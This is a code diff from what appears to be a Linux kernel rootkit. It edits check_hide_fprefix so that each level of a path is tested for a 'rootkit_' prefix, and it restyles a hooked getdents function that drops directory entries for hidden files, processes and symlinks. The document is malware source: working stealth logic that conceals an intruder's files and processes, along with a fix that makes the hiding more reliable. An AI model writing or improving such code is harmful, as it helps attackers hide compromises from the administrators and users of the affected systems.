@@ -85,13 +85,10 @@ check_hide_fprefix(char *path)
 		return 0;
 	}
 
+	d_name = path;
+	
 	do {
-		d_name = get_next_level(path);
-		
-		if(d_name == NULL) {
-			break;
-		}
-
+	
 		// TODO: implement dynamic prefixes
 		if(strstr(d_name, "rootkit_") == d_name) 
 		{
@@ -101,6 +98,8 @@ check_hide_fprefix(char *path)
 		{
 			return 1;
 		}
+		
+		d_name = get_next_level(d_name);
 	} while (d_name != NULL);
 	
 	return 0;
@@ -210,8 +209,7 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 	
 	path_len = get_path(fd, path, 1024);
 	memset(path+path_len, '/', 1);
-	while(tlen>0)
-	{
+	while(tlen>0) {
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
 		
@@ -221,16 +219,13 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		if(check_hide_fpath(path)
 				|| check_hide_fprefix(path)
 				|| check_hide_process(fd, dirp->d_name)
-				|| check_hide_symlink(path))
-		{	
+				|| check_hide_symlink(path)) {	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
-		}
-		else if(tlen != 0)
-		{
+		} else if(tlen != 0) {
 			dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
 		}
-
+		
 	}
 	
 	/* lock and decrease the call counter */
